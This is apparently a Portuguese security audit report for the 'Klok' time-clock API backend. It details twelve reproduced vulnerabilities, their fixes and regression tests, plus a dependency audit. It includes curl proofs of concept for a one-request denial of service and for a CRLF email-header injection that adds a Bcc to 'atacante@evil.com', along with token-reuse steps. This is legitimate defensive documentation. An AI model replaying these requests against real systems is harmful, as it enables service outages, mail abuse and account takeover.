# Segurança do Klok

Auditoria de segurança do backend (`klok-api/`) feita por testes dinâmicos, com a
API real em execução e requisições HTTP de verdade. Nenhum achado aqui é
resultado de leitura de código: todos foram reproduzidos.

Cada vulnerabilidade corrigida tem um teste de regressão em
`klok-api/test/ataques.test.js` que falha se o problema voltar. Isso foi
verificado revertendo cada correção e confirmando que o teste correspondente
quebra.

---

## Como reproduzir

```bash
cd klok-api
mise use node@22      # o projeto exige Node 22.5+ (node:sqlite)
npm test              # 77 testes, 32 deles de ataque
```

Sem pendência de segurança conhecida no backend. Os achados da auditoria foram
todos corrigidos: #13 (revogação de JWT), #14 (rate limit por endpoint), #15
(`nodemailer` 10.x com Helmet) e #16 (unicidade do coordenador garantida no banco).

A auditoria inteira foi feita com a API real em execução e requisições HTTP de
verdade, por isso as descrições abaixo trazem o `curl` e a resposta observada, e
não só a leitura do código.

Os testes de segurança vivem em dois arquivos:

- `test/ataques.test.js`: 32 testes de simulação de ataque, que cobrem as correções.
- `test/seguranca.test.js`: 4 testes de garantias de base (hash com sal, variáveis de ambiente).

---

## Resumo

| # | Achado | Severidade | Status |
|---|--------|-----------|--------|
| 1 | DoS remoto não autenticado | crítico | corrigido, com teste |
| 2 | Vazamento de stack trace e caminho do servidor | alto | corrigido, com teste |
| 3 | Injeção de cabeçalho de email (CRLF) | alto | corrigido, com teste |
| 4 | Fallback de desenvolvimento virava oráculo de senha | alto | corrigido, com teste |
| 5 | Rate limit compartilhado permite travar o login legítimo | médio | corrigido, com teste |
| 6 | Token JWT de 12h não é invalidado ao trocar a senha | médio | corrigido, com teste |
| 7 | Token de redefinição viaja na URL | médio | parcialmente |
| 8 | API sem TLS e sem headers de segurança | médio | parcialmente |
| 9 | Política de senha ausente | médio | parcialmente |
| 10 | Cadastro de funcionário aberto, sem aprovação | médio | em aberto |
| 11 | Página de redefinição sem limite de requisições | baixo | corrigido, com teste |
| 12 | Unicidade do coordenador só garantida na aplicação | baixo | corrigido, com teste |

---

## Corrigidos

### 1. DoS remoto não autenticado (crítico)

Uma única requisição derrubava a API inteira. Sem token, sem credencial, sem
conta cadastrada.

```bash
curl -X POST http://localhost:3000/api/auth/login -H 'content-type: application/json' -d '{}'
# processo do Node morria com código 1
```

A causa era uma cadeia de três falhas:

1. `usuario?.trim()` devolve `undefined` quando `usuario` não é string. O `?.`
   protege contra `null` e `undefined`, mas não contra tipos errados.
2. `undefined` chegava como parâmetro do SQLite em `buscarUsuarioPorLogin`, que
   lança `TypeError`.
3. O `TypeError` acontecia dentro de um handler `async`. O Express 4 não captura
   rejeição de promise, então virava unhandled rejection e o Node 24 aborta o
   processo.

O mesmo caminho era alcançável em `registrar`, `loginGoogle`, `esqueci-senha` e
`redefinir-senha`. Um `PUT /api/funcionarios/:id` com corpo vazio também quebrava,
por causa de `nome?.trim()` indo para o banco.

Correção em três camadas:

- `validacao.js`: `texto()` devolve `''` para qualquer valor que não seja string,
  então nada nunca mais chega `undefined` no banco.
- `db.js`: `paraTexto()` normaliza todo texto antes do bind, como segunda camada.
- `middlewares.js`: `asyncHandler` envolve todo handler, e um tratador de erros
  global devolve 500 genérico. Rejeição de promise não vira mais morte do processo.

Testes: `payload malformado nunca derruba a API nem vaza erro interno` roda 17
payloads malformados e verifica que nenhuma rejeição não tratada escapou, mais
`a API continua respondendo depois dos payloads malformados`.

### 2. Vazamento de stack trace (alto)

`PUT /api/funcionarios/:id` com `{}` devolvia HTTP 500 com HTML contendo o stack
trace completo, o caminho absoluto do servidor (`/home/.../db.js`), número da
linha e o código-fonte. Ajuda quem procura brechas.

Correção: tratador de erros global em `middlewares.js` que registra no servidor e
devolve só `{ "erro": "Erro interno no servidor" }`. Erros de cliente do
`express.json` (JSON malformado, corpo grande) continuam devolvendo 400 e 413.

### 3. Injeção de cabeçalho de email, CRLF (alto)

Cadeia completa, reproduzida de ponta a ponta:

```bash
# 1. atacante se cadastra normalmente
curl -X POST .../api/auth/registrar -d '{"usuario":"atacante","senha":"a","nome":"A"}'
# 2. grava email com CRLF no próprio perfil
curl -X PUT .../api/auth/eu -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"vitima@exemplo.com\r\nBcc: atacante@evil.com"}'
# 3. pede a recuperação usando esse email
curl -X POST .../api/auth/esqueci-senha -d '{"email":"vitima@exemplo.com\r\nBcc: atacante@evil.com"}'
```

Resultado observado: o email saía com o cabeçalho injetado,

```
"para": "vitima@exemplo.com\r\nbcc: atacante@evil.com"
```

isto é, a credencial SMTP da empresa servia para entregar mensagem a
destinatários escolhidos pelo atacante. Isso é CWE-93 e se combina com o CVE
alto do `nodemailer` 6.10.1 (ver dependências).

Correção: `emailValido()` em `validacao.js` rejeita qualquer caractere de
controle e exige formato de email. Aplicado no perfil, na recuperação de senha e
no cadastro do coordenador. `email.js` ganhou uma segunda camada, `destinatarioValido()`,
que o próprio serviço de email aplica antes de enviar.

### 4. Fallback de desenvolvimento virava oráculo (alto)

Quando não há SMTP, a rota de recuperação devolvia o token na resposta:

```json
{
  "mensagem": "Se este email estiver cadastrado...",
  "linkRedefinicao": "klok://redefinir-senha?token=1f396ff7...",
  "linkPagina": "http://localhost:3000/redefinir-senha/1f396ff7..."
}
```

A resposta genérica só se protegia quando o SMTP estava configurado, e o
guard era `!process.env.SMTP_HOST`, ou seja, configuração em vez de ambiente. Um
deploy sem SMTP permitia pedido de redefinição para qualquer email cadastrado e
devolvia o token pronto, tomada de conta.

Correção: o gate passou a ser `NODE_ENV`, não a ausência de SMTP. Em produção o
link nunca volta, o `email.js` de fallback lança em vez de vazar, e o `server.js`
avisa no boot se faltar SMTP.

---

## Em aberto

### 5. Rate limit compartilhado (médio, corrigido)

Um único `limitadorAuth` atendia os cinco endpoints de autenticação e o contador
era por IP. Vinte e duas requisições de registro travavam o login legítimo do
coordenador, reproduzido com o limitador antigo:

```
POST /api/auth/registrar x24 -> 201 ate a 21a, 429 a partir da 22a
POST /api/auth/coordenador       -> 201
POST /api/auth/login        -> 429  (o coordenador nem consegue entrar)
```

Agora cada rota tem o próprio balde, com janela e teto próprios. O login tem dois
níveis: um por IP (rede compartilhada) e um por IP mais usuário, então atacar uma
conta não consome a cota das outras. Quando o limite estoura, a resposta é 429 com
o cabeçalho `Retry-After` e o campo `tentarEmSegundos`, para o app dizer quanto
tempo esperar. A página `GET /redefinir-senha/:token`, que antes não passava por
limitador nenhum, também entrou.

O limite continua vivendo em memória, então reiniciar o processo zera os baldes.
Isso é aceitável enquanto houver uma única instância; com mais de uma, o próximo
passo é um armazenamento compartilhado (Redis ou a própria tabela do banco).

Testes de regressão: cadastro em excesso não trava o login do coordenador, login em
excesso devolve 429 com `Retry-After`, a página de redefinição é limitada por IP e
`esqueci-senha` tem teto de envios.

### 6. JWT sem revogação (médio, corrigido)

O token vivia 12 horas, sem `jti` e sem refresh token, então não havia como
revogá-lo. Reproduzido nos dois caminhos de troca de senha:

```bash
TOKEN=$(curl -s -X POST .../api/auth/login -d '{"usuario":"coordenador1","senha":"antiga"}' | jq .token)
curl -X PUT .../api/auth/senha -H "Authorization: Bearer $TOKEN" \
  -d '{"senhaAtual":"antiga","senhaNova":"nova1234"}'
# 200, senha trocada
curl .../api/funcionarios -H "Authorization: Bearer $TOKEN"
# 200 -> o token antigo ainda gerencia funcionários
```

O mesmo acontece depois de redefinir pelo email: o token emitido antes do reset
continua valendo. O app desloga localmente, mas o token segue vivo no servidor, e
quem o copiou continua com acesso de coordenador.

Resolvido na issue #13. A coluna `usuarios.senhaVersao` conta as trocas de senha, o
valor viaja no token como `v`, e o `autenticar` recusa token cujo `v` não bate
com a versão atual. Trocar ou redefinir a senha passa a derrubar as sessões
anteriores, inclusive o acesso de coordenador.

Um contador de versão foi escolhido no lugar de carimbo de tempo depois que a
primeira implementação falhou num teste: com `senhaAlteradaEm` em segundos, o
token emitido no mesmo segundo da troca era indistinguível do antigo, e a regra
restritiva deslogava o usuário imediatamente. Contador não tem granularidade.

Correção extra no mesmo caminho: `marcarRecuperacaoUsada` recebia o **id do
usuário** em vez do **id do registro**, então usar um link de recuperação invalidava
todos os links pendentes daquele usuário de uma vez. Passou a ser por registro,
o que é o que "token de uso único" significa.

### 7. Token de redefinição na URL (médio, parcialmente resolvido)

`/redefinir-senha/:token` põe o token no caminho, e o caminho aparece em log de
acesso e histórico do navegador. A página HTML também ecoava o token dentro de um
`onclick` inline.

Resolvido agora: o token só é interpolado se casar com `/^[0-9a-f]{64}$/`, há
escape de HTML, e as duas páginas mandam `Referrer-Policy: no-referrer`.

Falta resolver a causa: o token não deveria viajar na URL. Alternativa é um
formulário POST com o token no corpo, ou um código curto de uso único.

### 8. TLS e headers (médio, parcialmente resolvido)

A API escuta em `0.0.0.0` por HTTP puro, então o JWT trafega em claro na rede,
e o README desenha HTTPS que não existe no código.

Resolvido agora: `X-Powered-By` removido, e os headers de segurança passaram a
vir do `helmet`, com CSP (`default-src 'self'`, `frame-ancestors 'self'`),
`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` e
`Referrer-Policy: no-referrer`. O HSTS fica ligado somente em produção, porque
em desenvolvimento a API roda em HTTP. O `Cache-Control: no-store` continua
sendo aplicado à mão, porque o helmet não cobre cache.

A CSP obrigou a tirar o `onclick` inline da página de redefinição: o botão virou
um link `<a href="klok://...">`. Assim a página funciona sem script nenhum.

Falta: terminar o TLS na frente da API. O HSTS só tem efeito depois que existir
HTTPS de verdade.

### 9. Política de senha (médio, parcialmente resolvido)

`POST /api/auth/registrar` aceitava senha de um caractere, e o `SENHA_MESTRE`
antigo era `1234`, quatro dígitos que eu confirmei autenticando como coordenador.

Resolvido agora: mínimo de 4 caracteres no registro, troca, redefinição e no
cadastro do coordenador, e o `SENHA_MESTRE` deixou de existir, então a senha do coordenador
passa a ser a que o usuário digita na primeira tela.

Falta: exigir tamanho maior e alguma complexidade, e travar tentativas de senha
fraca. Quatro caracteres é o piso, não uma política.

### 10. Cadastro aberto (médio)

`POST /api/auth/registrar` é público e sem aprovação: qualquer pessoa cria conta
e já bate ponto. Login com Google também cria usuário para qualquer conta, sem
checar `email_verified` nem domínio.

Não corrigido por ser decisão de produto, não defeito. Mas vale saber que
"criei uma conta e entrei no app" é o estado atual.

### 11. Página de redefinição sem limite (baixo, corrigido)

Cinquenta GETs seguidos em tokens inválidos, todos 200, nenhum 429. Como o token
tem 256 bits, forçar é inviável, mas a rota não passa pelo limitador. Resolvido
 junto com o achado 5 (issue #14).

### 12. Unicidade do coordenador na primeira vez (baixo, regra removida na issue #27)

`POST /api/auth/coordenador` checa `existeCoordenador()` e depois insere. Como
`criarCoordenador` não tem `await` entre a checagem e o INSERT, o event loop do
Node serializa as requisições. Medi removendo o índice e disparando 4 POSTs
simultâneos 200 vezes, e em nenhuma rodada passou mais de um 201.

Na issue #16, quando só podia existir um coordenador, a garantia foi reforçada com
um índice único parcial em `usuarios(tipo) WHERE tipo = 'coordenador'`. A issue
#27 passou a permitir vários coordenadores, e a migração 6 removeu esse índice. A
rota pública continua criando apenas o primeiro; os demais entram por
`POST /api/coordenadores`, com um coordenador autenticado.

Risco residual: a rota pública depende de o controller continuar síncrono entre a
checagem e o INSERT. Se alguém introduzir um `await` nesse trecho, duas
requisições simultâneas de bootstrap poderiam criar dois coordenadores. O modelo
agora aceita vários, mas a regra de "só o primeiro pela rota pública" deixaria de
valer. O teste de concorrência em `ataques.test.js` guarda esse comportamento.

---

## Dependências

`npm audit` no backend em 2026-10-12, com Node 22.23.3: nenhuma alta, nenhuma
crítica e 2 moderadas. A auditoria anterior, de 2026-09-28, tinha 1 alta e 5
moderadas.

A alta era o `nodemailer`, resolvida com o major para a linha 10.x. Um crítico do
`proxy-addr` (transitivo do express) e um moderado do `qs` apareceram na
atualização da base de avisos e foram resolvidos com `npm audit fix`, sem
breaking.

| Pacote | Versão | Gravidade | Situação |
|--------|--------|-----------|----------|
| `nodemailer` | 6.10.1 para 10.1.0 | alta | resolvida, major |
| `proxy-addr` | via express | crítica | resolvida, sem breaking |
| `qs` | via express | moderada | resolvida, sem breaking |
| `uuid` | via `gaxios` | moderada | em aberto, exige major |
| `gaxios` | via google-auth-library | moderada | depende do `uuid` |

As 2 moderadas restantes vêm do `uuid` dentro do `gaxios`, que vem do
`google-auth-library`. Resolver exige um major do `google-auth-library`, fora do
escopo desta rodada, e precisa ser exercitado com login Google de verdade.

Sobre o `nodemailer`, o aviso alto tem 13 advisories no range `<= 10.0.1`, e três
merecem atenção neste projeto:

- **Injeção de cabeçalho por CRLF** em `List-*` e no nome do transport, que é o
  mesmo vetor do achado 3 e o que torna a validação de email obrigatória.
- **Validação TLS incorreta no fetch de token OAuth2**, que permite interceptar
  credencial. Relevante se algum dia o envio usar OAuth2 em vez de senha de app.
- **Cache de DNS por processo reutiliza o `servername` TLS entre transports**,
  o que pode vazar credencial SMTP para outro tenant.

Mitigação aplicada: `emailValido()` e `destinatarioValido()` fecham o vetor de
CRLF na aplicação, independentemente da versão instalada. A atualização para a
10.x continua indicada, e como é major, precisa de plano de teste: o caminho de
envio real (`enviarEmail`) deve ser exercitado com SMTP de verdade, não só com
mock.

---

## O que já estava certo

Isso foi verificado e continua coberto por teste, para não regredir:

- **Autorização no servidor.** 401 sem token e 403 para funcionário em toda rota
  de coordenador. A interface esconde as telas, mas quem decide é o backend.
- **Sem IDOR.** Os pontos usam o `funcionarioId` do token, nunca um id do corpo da
  requisição. Não dá para ler ou bater ponto no lugar de outra pessoa.
- **JWT íntegro.** `jose` com `algorithms: ['HS256']` rejeita `alg=none`,
  assinatura adulterada, token de outro segredo e token expirado.
- **Senha com scrypt e sal**, comparação em `timingSafeEqual`, e migração
  automática do hash legado SHA-256 no primeiro login.
- **Token de recuperação** guardado só como SHA-256, uso único, expiração de
  30 minutos.
- **Resposta genérica** em "esqueci minha senha" quando o SMTP está configurado.
- **Segredos fora do git.** Só `.env.example` é versionado, e o histórico não tem
  senha commitada.
- **Token do app em `expo-secure-store`**, com `secureTextEntry`,
  `autoCapitalize="none"` e `autoCorrect={false}`.
- **Nenhum segredo do coordenador em arquivo.** A senha é escolhida na primeira tela e
  nunca passa por `.env`.

---

## Regras que a suíte garante

Para manter o resultado, qualquer mudança precisa continuar passando:

- Nenhum `String(valor)` em campo vindo do cliente. Validação é com `validacao.js`.
- Todo handler de rota passa por `asyncHandler`.
- Nenhum `res.json` devolve `senhaHash` ou `tokenHash`.
- Mensagem de erro de autenticação não distingue "usuário não existe" de "senha
  errada".
